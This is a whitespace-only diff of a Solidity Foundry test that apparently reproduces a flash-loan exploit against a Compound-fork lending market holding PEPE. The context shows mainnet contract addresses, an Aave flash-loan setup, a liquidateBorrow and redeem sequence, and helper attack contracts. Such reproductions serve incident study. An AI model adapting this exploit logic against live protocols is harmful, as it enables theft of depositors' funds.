@@ -16,6 +16,7 @@ import "./../interface.sol";
 // https://twitter.com/DecurityHQ/status/1719657969925677161
 
 interface IComptroller {
+
     function liquidateCalculateSeizeTokens(
         address cTokenBorrowed,
         address cTokenCollateral,
@@ -23,9 +24,11 @@ interface IComptroller {
     ) external view returns (uint256, uint256);
 
     function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
+
 }
 
 contract ContractTest is Test {
+
     IAaveFlashloan private constant AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
     IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
@@ -254,9 +257,11 @@ contract ContractTest is Test {
         onyxToken.liquidateBorrow(address(intermediateToken), 1, address(oPEPE));
         oPEPE.redeem(oPEPE.balanceOf(address(this)));
     }
+
 }
 
 contract IntermediateContractETH {
+
     IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
     ICErc20Delegate private constant oPEPE = ICErc20Delegate(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
     crETH private constant oETHER = crETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));
@@ -286,9 +291,11 @@ contract IntermediateContractETH {
     }
 
     receive() external payable {}
+
 }
 
 contract IntermediateContractToken {
+
     IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
     ICErc20Delegate private constant oPEPE = ICErc20Delegate(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
     IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -324,4 +331,5 @@ contract IntermediateContractToken {
     }
 
     receive() external payable {}
+
 }
